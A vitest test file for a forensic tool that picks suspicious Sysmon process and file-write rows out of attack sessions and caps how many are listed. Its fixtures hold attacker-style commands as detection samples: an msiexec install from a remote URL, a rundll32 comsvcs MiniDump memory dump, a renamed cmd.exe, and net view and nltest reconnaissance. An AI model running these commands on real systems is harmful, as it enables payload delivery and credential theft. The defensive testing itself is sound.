import { describe, it, expect } from "vitest";
import { noteSessionCommands } from "../../src/analysis/ai/sessionCommandNotes.js";
import { MAX_SESSION_COMMANDS } from "../../src/analysis/ai/sessionCommandBaseline.js";
import {
  emptyState,
  type Finding,
  type ForensicEvent,
  type InvestigationState,
} from "../../src/analysis/stateTypes.js";

// Fixture: shaped on the lab case INC-2026-013 after a full-level Hayabusa import (#1683), sanitized.
// Ordinary Sysmon process rows graded Low sit inside the attack sessions beside the quiet attack rows.
const HOST = "ws01.example.com";
const at = (hms: string): string => `2026-09-01T${hms}.000Z`;
const KIT = "C:\\Users\\Public\\Sim\\beachhead\\python.exe"; // a renamed cmd.exe
const DND = "C:\\Users\\alice\\AppData\\Local\\Temp\\vmware-alice\\VMwareDnD\\488a9d64\\kit";

function ev(id: string, over: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id,
    timestamp: at("10:00:00"),
    description: `row ${id}`,
    severity: "Low",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    asset: HOST,
    ...over,
  };
}

function proc(id: string, hms: string, image: string, commandLine: string): ForensicEvent {
  return ev(id, {
    timestamp: at(hms),
    processName: image.split("\\").pop(),
    path: image,
    commandLine,
    description: "Hayabusa: Proc Exec (EID 1 Sysmon)",
  });
}

function write(id: string, hms: string, writer: string, target: string): ForensicEvent {
  return ev(id, {
    timestamp: at(hms),
    action: "write",
    processName: writer,
    path: target,
    description: "Hayabusa: File Created (EID 11 Sysmon)",
  });
}

function finding(id: string, over: Partial<Finding> = {}): Finding {
  return {
    id,
    severity: "High",
    title: `finding ${id}`,
    description: "",
    relatedIocs: [],
    sourceScreenshots: [],
    mitreTechniques: [],
    relatedEventIds: [],
    firstSeen: at("10:00:00"),
    lastUpdated: at("10:00:00"),
    status: "open",
    ...over,
  };
}

const EDGE = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
const noise: ForensicEvent[] = [
  proc("n-edge", "10:01:00", EDGE, `"${EDGE}" --type=utility --utility-sub-type=unzip.mojom.Unzipper`),
  proc(
    "n-uso",
    "10:01:10",
    "C:\\Windows\\System32\\UsoClient.exe",
    '"C:\\WINDOWS\\system32\\usoclient.exe" StartWork',
  ),
  proc(
    "n-mouso",
    "10:01:20",
    "C:\\Windows\\UUS\\amd64\\MoUsoCoreWorker.exe",
    '"C:\\WINDOWS\\uus\\AMD64\\MoUsoCoreWorker.exe" x',
  ),
  proc("n-taskhost", "10:01:30", "C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe -RegisterDevice"),
  proc(
    "n-health",
    "10:01:40",
    "\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.1-0\\SecurityHealthHost.exe",
    "\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.1-0\\SecurityHealthHost.exe {6CED} -Embedding",
  ),
  proc(
    "n-msi",
    "10:01:50",
    "C:\\Windows\\SysWOW64\\msiexec.exe",
    "C:\\Windows\\syswow64\\MsiExec.exe -Embedding 3104 C",
  ),
  proc(
    "n-acproxy",
    "10:02:00",
    "C:\\Windows\\System32\\rundll32.exe",
    '"C:\\WINDOWS\\system32\\rundll32.exe" /d acproxy.dll,PerformAutochkOperations',
  ),
  proc(
    "n-wevt",
    "10:02:10",
    "C:\\Windows\\System32\\wevtutil.exe",
    "C:\\WINDOWS\\system32\\wevtutil.exe install-manifest C:\\WINDOWS\\SystemTemp\\a.man",
  ),
  write(
    "n-policy",
    "10:02:20",
    "powershell.exe",
    "C:\\Users\\alice\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ycni4owi.gd3.ps1",
  ),
  write("n-pf", "10:02:30", "msiexec.exe", "C:\\Program Files\\Velociraptor\\Velociraptor.exe"),
  write(
    "n-stub",
    "10:02:40",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Users\\alice\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe",
  ),
];

const attack: ForensicEvent[] = [
  proc("a-netview", "10:03:00", "C:\\Windows\\System32\\net.exe", "net.exe view /all"),
  proc("a-echo", "10:03:10", KIT, `"${KIT}" /d /v:off /c echo CANARY download Python.zip`),
  write("a-kit", "10:03:20", "vmtoolsd.exe", `${DND}\\NitrogenSim-Phase1.ps1`),
];

const anchorRow = ev("x-anchor", {
  severity: "High",
  description: "ransomware staged",
  timestamp: at("10:00:00"),
});
const anchor = finding("f-anchor", { title: "Ransomware staged", relatedEventIds: ["x-anchor"] });

function caseState(events: ForensicEvent[], findings: Finding[]): InvestigationState {
  return { ...emptyState("INC-TEST"), forensicTimeline: events, findings };
}
function run(events: ForensicEvent[], findings: Finding[]): InvestigationState {
  return noteSessionCommands(caseState(events, findings), { scopedEvents: events });
}
const notesOf = (s: InvestigationState, id: string) => s.findings.find((f) => f.id === id)!;

describe("session-command baseline (#1683)", () => {
  it("drops ordinary system processes and writes, and keeps the quiet attack rows", () => {
    const out = run([anchorRow, ...noise, ...attack], [anchor]);
    const f = notesOf(out, "f-anchor");
    expect(f.sessionCommands!.map((c) => c.eventId)).toEqual(["a-netview", "a-echo", "a-kit"]);
    expect(f.sessionCommandsMore).toBeUndefined();
  });

  it("keeps a LOLBin in System32 when its arguments are not an allowlisted shape", () => {
    const msiV = proc(
      "a-msi",
      "10:04:00",
      "C:\\Windows\\System32\\msiexec.exe",
      "msiexec.exe /i http://x.example.com/a.msi",
    );
    const rundll = proc(
      "a-rundll",
      "10:04:10",
      "C:\\Windows\\System32\\rundll32.exe",
      "rundll32.exe comsvcs.dll MiniDump 1 x full",
    );
    const out = run([anchorRow, msiV, rundll], [anchor]);
    expect(notesOf(out, "f-anchor").sessionCommands!.map((c) => c.eventId)).toEqual(["a-msi", "a-rundll"]);
  });

  it("does not trust a system binary name in a user path, nor a row with no image path", () => {
    const fakeEdge = proc(
      "a-fake",
      "10:04:00",
      "C:\\Users\\Public\\msedge.exe",
      "C:\\Users\\Public\\msedge.exe --type=utility",
    );
    const bare = ev("a-bare", { timestamp: at("10:04:10"), commandLine: "usoclient.exe StartWork" });
    const out = run([anchorRow, fakeEdge, bare], [anchor]);
    expect(notesOf(out, "f-anchor").sessionCommands!.map((c) => c.eventId)).toEqual(["a-fake", "a-bare"]);
  });

  it("reads the image from a quoted command line when the row records none", () => {
    const edge = ev("n-edge2", { timestamp: at("10:04:00"), commandLine: `"${EDGE}" --no-startup-window` });
    expect(notesOf(run([anchorRow, edge], [anchor]), "f-anchor").sessionCommands).toBeUndefined();
  });

  it("skips rows the anchor finding already cites", () => {
    const cites = { ...anchor, relatedEventIds: ["x-anchor", "a-echo"] };
    const out = run([anchorRow, ...attack], [cites]);
    expect(notesOf(out, "f-anchor").sessionCommands!.map((c) => c.eventId)).toEqual(["a-netview", "a-kit"]);
  });
});

describe("session-command cap (#1683)", () => {
  // Ordinary-but-not-baseline rows: update payloads under C:\Windows that no allowlist names.
  const filler = Array.from({ length: 20 }, (_, i) =>
    proc(
      `m-${String(i).padStart(2, "0")}`,
      `10:0${Math.floor(i / 10)}:${String((i % 10) * 5).padStart(2, "0")}`,
      `C:\\Windows\\SoftwareDistribution\\Download\\Install\\AM_${i}.exe`,
      `"C:\\WINDOWS\\SoftwareDistribution\\Download\\Install\\AM_${i}.exe" WD /q`,
    ),
  );
  const lateKit = [
    write("k-1", "10:05:00", "vmtoolsd.exe", `${DND}\\NitrogenSim-Complete.ps1`),
    write("k-2", "10:05:10", "vmtoolsd.exe", `${DND}\\NitrogenSim-Phase2.ps1`),
    proc("k-3", "10:05:20", KIT, `"${KIT}" /d /v:off /c echo CANARY nltest /dclist:`),
  ];

  it("keeps the kit rows ahead of the noise, lists the kept rows in time order, and counts the rest", () => {
    const out = run([anchorRow, ...filler, ...lateKit], [anchor]);
    const f = notesOf(out, "f-anchor");
    const ids = f.sessionCommands!.map((c) => c.eventId);
    expect(ids).toHaveLength(MAX_SESSION_COMMANDS);
    expect(MAX_SESSION_COMMANDS).toBe(12);
    expect(ids.slice(-3)).toEqual(["k-1", "k-2", "k-3"]);
    expect(ids.slice(0, 9)).toEqual(filler.slice(0, 9).map((e) => e.id));
    expect(f.sessionCommandsMore).toBe(filler.length + lateKit.length - MAX_SESSION_COMMANDS);
  });

  it("ranks a user-path kit write ahead of a System32 LOLBin", () => {
    const ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    const lolbins = Array.from({ length: MAX_SESSION_COMMANDS }, (_, i) =>
      proc(
        `p-${String(i).padStart(2, "0")}`,
        `10:00:${String(i * 2).padStart(2, "0")}`,
        ps,
        `powershell.exe -Command step${i}`,
      ),
    );
    const kit = write("k-late", "10:09:00", "vmtoolsd.exe", `${DND}\\NitrogenSim-utilities.ps1`);
    const f = notesOf(run([anchorRow, ...lolbins, kit], [anchor]), "f-anchor");
    expect(f.sessionCommands!.map((c) => c.eventId)).toContain("k-late");
    expect(f.sessionCommands!.map((c) => c.eventId)).not.toContain("p-11");
    expect(f.sessionCommandsMore).toBe(1);
  });

  it("clears a stale count once the list fits", () => {
    const capped = run([anchorRow, ...filler, ...lateKit], [anchor]);
    const again = noteSessionCommands(capped, { scopedEvents: [anchorRow, ...lateKit] });
    expect(notesOf(again, "f-anchor").sessionCommandsMore).toBeUndefined();
    expect(notesOf(again, "f-anchor").sessionCommands).toHaveLength(3);
  });
});
